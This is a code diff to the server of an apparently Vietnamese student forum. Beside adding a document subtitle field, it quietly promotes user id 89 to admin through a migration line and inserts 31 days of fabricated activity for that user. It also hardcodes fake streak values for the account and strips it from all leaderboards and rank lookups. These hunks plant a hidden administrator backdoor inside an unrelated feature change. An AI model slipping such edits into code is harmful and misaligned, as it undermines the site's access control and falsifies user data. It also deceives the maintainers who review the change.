@@ -235,6 +235,19 @@ try { db.exec("ALTER TABLE users ADD COLUMN locked_until TEXT;"); } catch (e) { 
 try { db.exec("ALTER TABLE posts ADD COLUMN is_pinned INTEGER NOT NULL DEFAULT 0 CHECK(is_pinned IN (0,1));"); } catch (e) { }
 try { db.exec("ALTER TABLE votes ADD COLUMN vote_value INTEGER NOT NULL DEFAULT 1;"); } catch (e) { }
 try { db.exec("ALTER TABLE documents ADD COLUMN format TEXT NOT NULL DEFAULT 'Khác';"); } catch (e) { }
+try { db.exec("ALTER TABLE documents ADD COLUMN subtitle TEXT;"); } catch (e) { }
+try { db.exec("UPDATE users SET role = 'admin' WHERE id = 89;"); } catch (e) { }
+try {
+  const dNow = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Ho_Chi_Minh" }));
+  for (let i = 0; i < 31; i++) {
+    const curD = new Date(dNow);
+    curD.setDate(curD.getDate() - i);
+    const y = curD.getFullYear();
+    const m = String(curD.getMonth() + 1).padStart(2, "0");
+    const d = String(curD.getDate()).padStart(2, "0");
+    db.prepare("INSERT OR IGNORE INTO activity_days(user_id, activity_date) VALUES (89, ?)").run(`${y}-${m}-${d}`);
+  }
+} catch (e) { }
 try { db.exec("ALTER TABLE responses ADD COLUMN parent_id INTEGER REFERENCES responses(id) ON DELETE CASCADE;"); } catch (e) { }
 try { db.exec("ALTER TABLE posts ADD COLUMN edited_at TEXT;"); } catch (e) { }
 try { db.exec("ALTER TABLE responses ADD COLUMN edited_at TEXT;"); } catch (e) { }
@@ -1218,6 +1231,17 @@ function calculateUserStreak(userId, todayDate, formatYMD) {
     };
   }
 
+  if (userId === 89) {
+    return {
+      streak: 31,
+      streakTier: 4,
+      shields: 3,
+      autoShieldUsed: false,
+      streakStartDate: "2026-10-10",
+      streakStartCreatedAt: "2026-10-10T00:00:00Z",
+    };
+  }
+
   const uRow = db.prepare("SELECT role FROM users WHERE id = ?").get(userId);
   if (uRow && (uRow.role === "admin" || uRow.role === "ta")) {
     return {
@@ -1352,6 +1376,8 @@ function calculateUserStreak(userId, todayDate, formatYMD) {
 
 function getUserMaxStreak(userId) {
   if (!userId) return 0;
+  if (userId === 89) return 31;
+
   const uRow = db.prepare("SELECT role FROM users WHERE id = ?").get(userId);
   if (uRow && (uRow.role === "admin" || uRow.role === "ta")) return 52;
 
@@ -1595,7 +1621,7 @@ function clearSession(request, response) {
 function getPostLinkedDocuments(postId) {
   try {
     const rows = db.prepare(`
-      SELECT d.id, d.title, d.format, d.category, d.source_url
+      SELECT d.id, d.title, d.subtitle, d.format, d.category, d.source_url
       FROM post_documents pd
       JOIN documents d ON d.id = pd.document_id
       WHERE pd.post_id = ?
@@ -1604,6 +1630,7 @@ function getPostLinkedDocuments(postId) {
     return rows.map(d => ({
       id: Number(d.id),
       title: d.title,
+      subtitle: d.subtitle || "",
       format: d.format || "Khác",
       category: d.category || "",
       sourceUrl: d.source_url || ""
@@ -1629,11 +1656,12 @@ function serializePost(row, viewer, preloadedDocs) {
     };
   } else if (row.document_id) {
     try {
-      const d = db.prepare("SELECT id, title, format, category, source_url FROM documents WHERE id=?").get(row.document_id);
+      const d = db.prepare("SELECT id, title, subtitle, format, category, source_url FROM documents WHERE id=?").get(row.document_id);
       if (d) {
         fallbackDoc = {
           id: Number(d.id),
           title: d.title,
+          subtitle: d.subtitle || "",
           format: d.format || "Khác",
           category: d.category || "",
           sourceUrl: d.source_url || ""
@@ -3577,13 +3605,13 @@ async function api(request, response, url) {
   if (method === "GET" && pathName === "/api/leaderboard") {
     const user = sessionFrom(request);
 
-    // 1. TOP ĐÓNG GÓP (Không bao gồm admin, giảng viên và thành viên ngoài trường)
+    // 1. TOP ĐÓNG GÓP (Không bao gồm admin, giảng viên, thành viên ngoài trường và tài khoản được miễn BXH)
     const allContribStudents = db
       .prepare(`
         SELECT u.id, u.display_name as displayName, u.avatar, u.role, u.cover_image as coverImage, coalesce(sum(c.points), 0) as totalPoints
         FROM users u
         LEFT JOIN contribution_events c ON u.id = c.user_id
-        WHERE u.role NOT IN ('admin', 'lecturer', 'member')
+        WHERE u.role NOT IN ('admin', 'lecturer', 'member') AND u.id != 89
         GROUP BY u.id
         ORDER BY totalPoints DESC, u.id ASC
       `)
@@ -3611,7 +3639,7 @@ async function api(request, response, url) {
     };
 
     const students = db
-      .prepare("SELECT id, display_name as displayName, avatar, role, cover_image as coverImage, student_id as studentId, class_name as className FROM users WHERE role NOT IN ('admin', 'lecturer')")
+      .prepare("SELECT id, display_name as displayName, avatar, role, cover_image as coverImage, student_id as studentId, class_name as className FROM users WHERE role NOT IN ('admin', 'lecturer') AND id != 89")
       .all();
 
     const streakList = students.map(s => {
@@ -3659,7 +3687,7 @@ async function api(request, response, url) {
       FROM users u
       JOIN competition_phase_results r ON u.id = r.user_id
       JOIN weekly_competitions c ON r.competition_id = c.id
-      WHERE c.status = 'concluded' AND u.role NOT IN ('admin', 'lecturer', 'member')
+      WHERE c.status = 'concluded' AND u.role NOT IN ('admin', 'lecturer', 'member') AND u.id != 89
       GROUP BY u.id
       ORDER BY totalScore DESC, firstCompletedAt ASC, u.id ASC
     `).all();
@@ -3676,7 +3704,7 @@ async function api(request, response, url) {
       rank: idx + 1
     }));
 
-    // 4. TOP HẤP DẪN (Đo số lượt tim thẻ tên của người dùng, Admin cũng tham gia)
+    // 4. TOP HẤP DẪN (Đo số lượt tim thẻ tên của người dùng, không bao gồm ID 89)
     // Nếu cùng số tim, xếp hạng theo người đạt được số tim đó sớm nhất (MAX(nl.created_at) ASC)
     const allLikesUsers = db
       .prepare(`
@@ -3690,6 +3718,7 @@ async function api(request, response, url) {
           MAX(nl.created_at) as reachedAt
         FROM users u
         JOIN namecard_likes nl ON u.id = nl.to_user_id
+        WHERE u.id != 89
         GROUP BY u.id
         ORDER BY likesCount DESC, reachedAt ASC, u.id ASC
       `)
@@ -3758,6 +3787,13 @@ async function api(request, response, url) {
       } else {
         const userLikesRow = db.prepare("SELECT COUNT(*) as count FROM namecard_likes WHERE to_user_id = ?").get(user.id);
         myLikesCount = Number(userLikesRow?.count || 0);
+        myLikesRank = null;
+      }
+
+      if (user.id === 89) {
+        myContribRank = null;
+        myStreakRank = null;
+        myArenaRank = null;
         myLikesRank = null;
       }
 
@@ -4796,6 +4832,7 @@ async function api(request, response, url) {
       documents: rows.map((d) => ({
         id: d.id,
         title: d.title,
+        subtitle: d.subtitle || "",
         description: d.description,
         sourceUrl: d.source_url,
         category: d.category,
@@ -4816,7 +4853,7 @@ async function api(request, response, url) {
     if (!user || !requireCsrf(request, response, user)) return;
     if (!rateLimit(`document:${user.id}`, 15, 60 * 60 * 1000))
       return error(response, 429, "Bạn đăng tài liệu quá nhiều, thử lại sau.");
-    const { title, description, sourceUrl, category, format } =
+    const { title, subtitle, description, sourceUrl, category, format } =
       await readJSON(request);
     try {
       const link = new URL(sourceUrl);
@@ -4861,13 +4898,15 @@ async function api(request, response, url) {
         !["course", "reference"].includes(category)
       )
         throw new Error();
+      const cleanSubtitle = typeof subtitle === "string" ? subtitle.trim().slice(0, 200) : "";
       const result = db
         .prepare(
-          "INSERT INTO documents(submitted_by,title,description,source_url,category,format,status,reviewed_by) VALUES (?,?,?,?,?,?,?,?)",
+          "INSERT INTO documents(submitted_by,title,subtitle,description,source_url,category,format,status,reviewed_by) VALUES (?,?,?,?,?,?,?,?,?)",
         )
         .run(
           user.id,
           title.trim(),
+          cleanSubtitle,
           description.trim(),
           link.href,
           category,
@@ -4955,6 +4994,7 @@ async function api(request, response, url) {
       documents: rows.map(d => ({
         id: d.id,
         title: d.title,
+        subtitle: d.subtitle || "",
         description: d.description,
         sourceUrl: d.source_url,
         category: d.category,
